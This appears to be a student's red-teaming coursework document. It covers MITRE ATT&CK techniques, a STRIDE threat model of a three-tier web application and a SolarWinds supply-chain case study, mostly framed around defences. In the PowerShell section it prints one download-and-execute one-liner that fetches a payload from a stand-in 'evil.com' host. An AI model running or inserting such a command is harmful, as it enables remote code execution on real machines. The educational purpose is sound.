# 🎯 Advanced Threat Analysis
**CyArt Red Teaming — Week 2 | Theory Document 1**
**Submitted by:** Krunal | Enrollment: 221040107040 | GTU-ITR, Mehsana

---

## 📌 Table of Contents
1. [MITRE ATT&CK Framework](#1-mitre-attck-framework)
2. [ATT&CK Navigator — Attack Chain](#2-attck-navigator--attack-chain)
3. [STRIDE Threat Model](#3-stride-threat-model)
4. [SolarWinds Case Study](#4-solarwinds-supply-chain-attack--case-study)

---

## 1. MITRE ATT&CK Framework

### What is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world cyberattack observations. Security teams use it to understand how attackers behave and build strong defenses against them.

> 🔗 Source: https://attack.mitre.org → Matrices → Enterprise

---

### Key Techniques Studied

| Technique ID | Technique Name | Tactic | Description | Key Defense |
|-------------|---------------|--------|-------------|-------------|
| **T1566** | Phishing | Initial Access | Attackers send malicious emails with links or attachments to gain access into a target network. | Email filtering, MFA, user training |
| **T1059** | Command & Scripting Interpreter | Execution | Attackers use PowerShell, Bash, or Python to run malicious commands on compromised systems. | Script block logging, AppLocker, EDR |
| **T1190** | Exploit Public-Facing Application | Initial Access | Attackers exploit vulnerabilities in internet-facing apps (web servers, VPNs) to gain access. | Patch management, WAF, vuln scanning |
| **T1071** | Application Layer Protocol | Command & Control | Attackers use HTTP/HTTPS/DNS to communicate with compromised machines undetected. | Deep packet inspection, DNS monitoring |

---

### T1566 — Phishing (Detailed Analysis)

**Technique:** T1566 — Phishing
**Tactic:** Initial Access
**Sub-techniques:** T1566.001 (Attachment), T1566.002 (Link), T1566.003 (via Service)

#### What It Is:
Phishing is the most common initial access technique used by threat actors worldwide. Attackers send fraudulent emails that appear to come from trusted sources such as banks, IT departments, or colleagues. These emails contain malicious attachments (Office macros, PDFs) or links to credential-harvesting websites designed to steal usernames and passwords.

#### How Attackers Use It:
1. **Reconnaissance** — Attacker researches the target on LinkedIn, company website, and social media to craft a convincing, personalized email (spearphishing).
2. **Delivery** — Sends email with a subject like *"Urgent: Invoice attached"* or *"Your password expires today"*.
3. **Execution** — Victim opens the attachment → macro executes → malware downloads in background → attacker gets a foothold into the network.
4. **Lateral Movement** — Attacker moves from the compromised machine to other systems in the network using stolen credentials.

#### Defenses Against T1566:
- **Email gateway filtering** — Block malicious attachments and suspicious sender domains automatically.
- **Multi-Factor Authentication (MFA)** — Even if credentials are stolen, attacker cannot log in without the second factor.
- **Security awareness training** — Educate users to identify phishing indicators (sender mismatch, urgency, suspicious links).
- **Disable Office macros** — Use Group Policy to prevent macro execution in Office documents.
- **DMARC / DKIM / SPF** — Email authentication protocols that prevent domain spoofing.

---

### T1059 — Command & Scripting Interpreter (Detailed Analysis)

**Technique:** T1059.001 — PowerShell
**Tactic:** Execution

#### What It Is:
Attackers abuse built-in scripting environments like Windows PowerShell, Windows Command Shell, Bash (Linux/macOS), and Python to execute malicious code on compromised systems. PowerShell is especially popular because it is powerful, trusted by Windows, and often not monitored.

#### How Attackers Use It:
- Download malware directly into memory (fileless attack): `powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"`
- Execute encoded commands to bypass simple string detection.
- Use PowerShell remoting to move laterally across the network.

#### Defenses:
- Enable **PowerShell Script Block Logging** (Event ID 4104).
- Use **AppLocker** or **Windows Defender Application Control** to restrict script execution.
- Deploy an **EDR** (Endpoint Detection and Response) that monitors process creation.
- Set **PowerShell Execution Policy** to `AllSigned` or `RemoteSigned`.

---

### T1190 — Exploit Public-Facing Application (Detailed Analysis)

**Technique:** T1190
**Tactic:** Initial Access

#### What It Is:
Attackers exploit weaknesses in internet-facing applications — web servers, VPNs, APIs, load balancers — to gain unauthorized access. These vulnerabilities include SQL injection, buffer overflows, authentication bypass, and unpatched CVEs.

#### Real-World Examples:
- **Log4Shell (CVE-2021-44228)** — Critical RCE in Apache Log4j affecting millions of systems.
- **ProxyLogon (CVE-2021-26855)** — Microsoft Exchange Server RCE exploited by nation-state actors.
- **EternalBlue (MS17-010)** — SMB vulnerability exploited by WannaCry and NotPetya ransomware.

#### Defenses:
- Regular **vulnerability scanning** (OpenVAS, Nessus) and timely patching.
- Deploy a **Web Application Firewall (WAF)**.
- Use **network segmentation** to limit what internet-facing servers can reach internally.
- Implement **intrusion detection** (Suricata, Snort) to alert on exploit patterns.

---

## 2. ATT&CK Navigator — Attack Chain

### Purpose
The ATT&CK Navigator is a web tool for visualizing which MITRE ATT&CK techniques are being studied, detected, or used in a specific attack scenario.

> 🔗 Tool: https://mitre-attack.github.io/attack-navigator

### Steps Performed:
1. Opened ATT&CK Navigator → Created New Layer → Enterprise ATT&CK
2. Searched and color-highlighted the following techniques:
   - **T1566** (Phishing) → Highlighted in **Red** (High Threat)
   - **T1059** (Command & Scripting Interpreter) → Highlighted in **Orange** (Medium-High)
   - **T1190** (Exploit Public-Facing Application) → Highlighted in **Yellow** (Medium)
3. Exported the layer as SVG → saved as `mitre_attack_navigator.png`

### Attack Chain Visualized:

```
[Initial Access]          [Execution]            [Command & Control]
T1566 - Phishing    →    T1059 - PowerShell  →   T1071 - HTTP/S C2
     ↓
T1190 - Exploit
Public-Facing App
```

### Navigator Screenshot:
> 📸 See: `Theory/screenshots/mitre_attack_navigator.png`

---

## 3. STRIDE Threat Model

### What is STRIDE?

STRIDE is a threat modeling framework developed by Microsoft to systematically identify security threats in any system. Each letter represents a different threat category mapped to specific security properties.

| Letter | Threat | Security Property Violated | Example |
|--------|--------|---------------------------|---------|
| **S** | Spoofing | Authentication | Attacker impersonates a user by stealing session cookies |
| **T** | Tampering | Integrity | SQL injection modifies database records |
| **R** | Repudiation | Non-repudiation | User denies action because logs are missing |
| **I** | Information Disclosure | Confidentiality | Sensitive data leaked via verbose error messages |
| **D** | Denial of Service | Availability | Server flooded with requests, crashes |
| **E** | Elevation of Privilege | Authorization | Low-privilege user gains admin access via misconfiguration |

---

### STRIDE Applied to: User → Web App → Database

**System Scope:** A standard 3-tier web application

```
[User] ──────────────→ [Web Application] ──────────────→ [Database]
         Login/Forms          Business Logic                  Data Store
```

| Component / Flow | STRIDE Threat | Specific Attack | Mitigation |
|-----------------|--------------|-----------------|-----------|
| User → Web App (Login) | **Spoofing** | Attacker steals session token and impersonates authenticated user | HTTPS, secure session management, MFA, HttpOnly cookies |
| User → Web App (Forms) | **Tampering** | Attacker injects malicious input via login/search forms | Input validation, WAF, CSP headers |
| Web App → Database | **Tampering** | SQL Injection — attacker manipulates queries to extract or delete data | Parameterized queries, ORM, least-privilege DB accounts |
| Web App (Logs) | **Repudiation** | Attacker deletes log files to remove evidence after intrusion | Centralized SIEM logging, write-once log storage |
| Web App → User | **Information Disclosure** | Error messages reveal database structure and internal file paths | Disable verbose errors, implement custom error pages |
| Web App Server | **Denial of Service** | Attacker sends thousands of requests per second to crash the server | Rate limiting, CDN, DDoS protection, load balancer |
| Web App (Access Control) | **Elevation of Privilege** | Low-privilege user exploits broken access control to reach admin panel | RBAC, principle of least privilege, access control reviews |

---

### STRIDE Diagram:
> 📸 See: `Theory/screenshots/stride_threat_model.png`
> Created using draw.io — User → Web App → Database with threat annotations

---

### 100-Word Explanation:

The STRIDE threat model was applied to a 3-tier web application with User, Web Application, and Database components. Spoofing threats target the User-to-Application login boundary through session hijacking and cookie theft, mitigated by MFA and HTTPS. Tampering threats affect input forms via SQL injection and the database layer, requiring parameterized queries. Repudiation risks arise from missing audit logs, countered by centralized SIEM integration. Information Disclosure occurs through verbose error messages, requiring custom error handling. Denial of Service attacks threaten server availability, mitigated by rate limiting and CDN protection. Finally, Elevation of Privilege is countered through strict Role-Based Access Control enforcement across all user roles.

---

## 4. SolarWinds Supply Chain Attack — Case Study

### Background
The SolarWinds Orion attack (2020) is one of the most sophisticated supply chain attacks in history. It was attributed to APT29 (Cozy Bear), a Russian state-sponsored threat group. The attack affected over 18,000 organizations including multiple US government agencies and Fortune 500 companies.

> 🔗 Source: Mandiant SolarWinds Report — https://www.mandiant.com/resources/evasive-attacker-leverages-solarwinds-supply-chain

---

### 5-Point Case Study Analysis

| # | Category | Details |
|---|----------|---------|
| **1** | **How Attackers Got In** | Attackers compromised SolarWinds' software build pipeline (CI/CD system) in late 2019. They injected the **SUNBURST backdoor** into legitimate Orion software updates (versions 2019.4 to 2020.2.1). When customers updated their software, they unknowingly installed the malware along with the legitimate update. |
| **2** | **What They Did** | SUNBURST established a stealthy Command & Control (C2) channel over HTTPS to attacker-controlled domains disguised as legitimate Orion API traffic. Attackers moved laterally inside victim networks, stole credentials, exfiltrated sensitive emails and documents, and installed secondary backdoors (TEARDROP, RAINDROP) for persistent access. |
| **3** | **How Long Undetected** | Initial compromise: **October 2019**. Discovered: **December 2020** by FireEye (now Mandiant). Total undetected period: **over 14 months**. The malware used a dormancy period of up to 2 weeks after installation before activating, and mimicked legitimate Orion network traffic patterns to evade detection. |
| **4** | **Impact** | Confirmed victims include: US Treasury, Department of Homeland Security, Department of Justice, Microsoft, Intel, Cisco, and approximately **18,000+ organizations** worldwide that downloaded the compromised update. Classified government data and source code were among the materials potentially exfiltrated. |
| **5** | **Key Lessons Learned** | 1) Software supply chains are critical attack surfaces requiring code integrity verification and build pipeline security audits. 2) Even digitally signed and trusted software updates must be monitored for anomalous behavior post-installation. 3) Network segmentation limits blast radius when a trusted tool is compromised. 4) Behavioral analytics and threat hunting can detect sophisticated attackers that evade signature-based tools. 5) Zero-trust architecture assumes breach and verifies every connection. |

---

### MITRE ATT&CK Mapping — SolarWinds

| ATT&CK Technique | How SolarWinds Used It |
|-----------------|----------------------|
| T1195.002 — Compromise Software Supply Chain | Injected SUNBURST into SolarWinds Orion build pipeline |
| T1071.001 — Web Protocols (C2) | Used HTTPS to communicate with C2 servers disguised as Orion API calls |
| T1027 — Obfuscated Files | SUNBURST code was heavily obfuscated to evade antivirus detection |
| T1078 — Valid Accounts | Used stolen credentials to move laterally and access victim systems |
| T1041 — Exfiltration Over C2 Channel | Data exfiltrated through the same encrypted HTTPS C2 channel |

---

*Document prepared for CyArt Red Teaming Week 2 | Krunal | GTU-ITR Mehsana*
